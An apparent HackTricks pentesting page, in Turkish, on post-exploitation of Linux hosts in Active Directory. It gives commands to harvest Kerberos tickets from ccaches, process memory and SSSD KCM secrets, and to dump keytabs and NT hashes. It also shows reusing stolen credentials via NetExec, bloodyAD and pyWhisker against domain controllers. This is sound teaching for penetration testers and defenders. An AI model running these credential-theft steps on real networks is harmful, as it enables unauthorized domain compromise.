# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Bir linux makine de bir Active Directory ortamında bulunabilir.

Bir AD içindeki Linux makine yerel olarak **Kerberos materyali** saklayabilir: kullanıcı ccaches, makine/service keytabs ve SSSD tarafından yönetilen secrets. Bu artefacts genellikle diğer Kerberos credential'ları gibi yeniden kullanılabilir. Bunların çoğunu okuyabilmek için ticket'ın kullanıcı sahibi olmanız veya makinede **root** olmanız gerekir.

## Enumeration

### linux'dan AD enumeration

Eğer bir AD üzerinde linux'ta (veya Windows'ta bash) erişiminiz varsa, AD'yi enumerate etmek için [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) kullanmayı deneyebilirsiniz.

Ayrıca **linux'dan AD'yi enumerate etmenin diğer yollarını** öğrenmek için aşağıdaki sayfayı da kontrol edebilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA, özellikle **Unix** ortamları için Microsoft Windows **Active Directory**'ye açık kaynaklı bir **alternatif**tir. Active Directory benzeri yönetim için tam bir **LDAP directory** ile MIT **Kerberos** Key Distribution Center'ı birleştirir. CA ve RA certificate yönetimi için Dogtag **Certificate System** kullanarak, smartcard'lar dahil **multi-factor** authentication destekler. Unix authentication süreçleri için SSSD entegredir. Hakkında daha fazla bilgi için:

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Ticket'lara dokunmadan önce, **host'un AD'ye nasıl join edildiğini** ve **Kerberos materyalinin gerçekte nerede saklandığını** belirleyin. Modern Linux host'larda bu genellikle `realmd` + `adcli` + `sssd` tarafından yönetilir, yalnızca `/tmp` içindeki düz dosyalar tarafından değil:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Bu, host’un AD’ye güvenip güvenmediğini, SSSD’nin kimlikleri veya ticket’ları cacheleyip cachelemediğini ve suistimal için **machine/service keytabs** veya **KCM secrets** olup olmadığını hızlıca söyler.

## Tickets ile oynamak

### Pass The Ticket

Bu sayfada, bir Linux host içinde **kerberos tickets** bulabileceğiniz farklı yerleri göreceksiniz; sonraki sayfada bu CCache ticket formatlarını Kirbi’ye (Windows’ta kullanmanız gereken format) nasıl dönüştüreceğinizi ve ayrıca bir PTT attack nasıl yapacağınızı öğrenebilirsiniz:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux'a özgü ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, vb.) istiyorsanız, özel sayfayı kontrol edin:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### `/tmp` içinden CCACHE ticket reuse

CCACHE dosyaları, **Kerberos credentials** saklamak için kullanılan binary formatlardır. `FILE:/tmp/krb5cc_%{uid}` hâlâ yaygındır, ancak modern Linux deployments ayrıca `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` veya `KCM:%{uid}` de kullanır. Ticket’ların `/tmp` içinde olduğunu varsaymadan önce **`KRB5CCNAME`** environment variable’ını ve `default_ccache_name` ayarını kontrol edin.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### keyring'den CCACHE ticket reuse

**Bir process'in memory'sinde saklanan Kerberos tickets çıkarılabilir**, özellikle makinede ptrace protection devre dışıysa (`/proc/sys/kernel/yama/ptrace_scope`). Bu amaç için kullanışlı bir tool [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) adresinde bulunur; sessions içine inject ederek ve tickets'ı `/tmp` içine dump ederek extraction işlemini kolaylaştırır.

Bu tool'u configure etmek ve kullanmak için aşağıdaki adımlar izlenir:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Bu prosedür, çeşitli oturumlara inject etmeyi deneyecek ve başarıyı, çıkarılan ticket'ları `/tmp` içinde `__krb_UID.ccache` adlandırma kuralıyla saklayarak gösterecektir.

### SSSD KCM'den CCACHE ticket reuse

SSSD, veritabanının bir kopyasını `/var/lib/sss/secrets/secrets.ldb` yolunda tutar. İlgili key, `/var/lib/sss/secrets/.secrets.mkey` yolunda gizli bir dosya olarak saklanır. Varsayılan olarak, key yalnızca **root** yetkilerine sahipseniz okunabilir.

**`SSSDKCMExtractor`** aracını --database ve --key parametreleriyle çalıştırmak, veritabanını ayrıştıracak ve **secrets**'i decrypt edecektir.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob** kullanılabilir bir **Kerberos CCache** dosyasına dönüştürülebilir ve bu dosya Mimikatz/Rubeus’a verilebilir.

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab içinden accounts çıkarma

Root ayrıcalıklarıyla çalışan services için gerekli olan service account keys, **`/etc/krb5.keytab`** dosyalarında güvenli şekilde saklanır. Bu keys, services için passwords’a benzer ve sıkı gizlilik gerektirir.

Keytab dosyasının içeriğini incelemek için **`klist`** kullanılabilir. Linux’ta `klist -k -K -e`, principals, key version numbers, encryption types ve raw key material bilgisini yazdırır. Eğer key type **23 / RC4-HMAC** ise, key value ayrıca o principal’ın **NT hash**’idir.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linux kullanıcıları için, **`KeyTabExtract`** RC4 HMAC hash'ini çıkarmak için işlevsellik sunar; bu, NTLM hash yeniden kullanımı için kullanılabilir. Bunun yalnızca keytab hâlâ **etype 23 / RC4-HMAC** materyali içerdiğinde işe yaradığını unutmayın. **AES-only** ortamlarda yeniden kullanılabilir bir NT hash elde edemeyebilirsiniz, ancak yine de keytab ile doğrudan Kerberos üzerinden kimlik doğrulaması yapabilirsiniz.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS üzerinde, **`bifrost`** keytab dosyası analizi için bir araç olarak kullanılır.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Çıkartılan account ve hash bilgileri kullanılarak, sunuculara **`NetExec`** gibi araçlarla bağlantılar kurulabilir.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` dosyasından machine account'u yeniden kullanın

`realmd`/`adcli`/`sssd` ile join edilmiş sistemlerde, `/etc/krb5.keytab` genellikle **computer account** ve bir veya daha fazla **host/service principals** içerir. Eğer **root** erişiminiz varsa, sadece dump etmeyin: `klist -k` ile listelenen principals'tan birini kullanarak bir TGT isteyin ve Linux host'un kendisi gibi hareket edin.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Bu özellikle **computer object**'in kendisinin AD içinde delegated rights'a sahip olduğu veya host'un bir **gMSA** gibi diğer secrets'ları retrieve etmesine izin verildiği durumlarda çok faydalıdır.

### Stolen Kerberos material'ı Linux-first AD tooling ile reuse etme

Geçerli bir `ccache` veya kullanılabilir bir keytab elde ettikten sonra, her şeyi önce Windows formatlarına dönüştürmeden AD'ye **doğrudan Linux üzerinden** operasyon yapabilirsiniz. Birçok modern tool `KRB5CCNAME` / Kerberos auth'u doğal olarak kabul eder:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Bu, **Linux post-exploitation** ile **AD object abuse** arasında iyi bir köprüdür. Nesne düzeyi abuse yollarının kendileri için şunlara bakın:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Son Linux deployments, **Managed Service Accounts**'ları doğrudan AD'den kullanabilir. Pratikte bu, bir Linux server'ı ele geçirdikten sonra yalnızca host keytab değil, aynı zamanda bir gMSA'dan üretilmiş **service-specific keytabs** da bulabileceğiniz anlamına gelir. İncelenmesi gereken yaygın yerler `/etc/gmsad.conf`, deployment-specific config files ve `/etc` altında bulunan ek `*.keytab` dosyalarıdır.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Bu, herhangi bir Windows endpoint'e dokunmadan o gMSA'ya bağlı SPN'ler için yeniden kullanılabilir bir Kerberos kimliği verir. AD'de daha yüksek ayrıcalıklardan sonra **domain-side** gMSA/dMSA abuse için şuna bakın:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
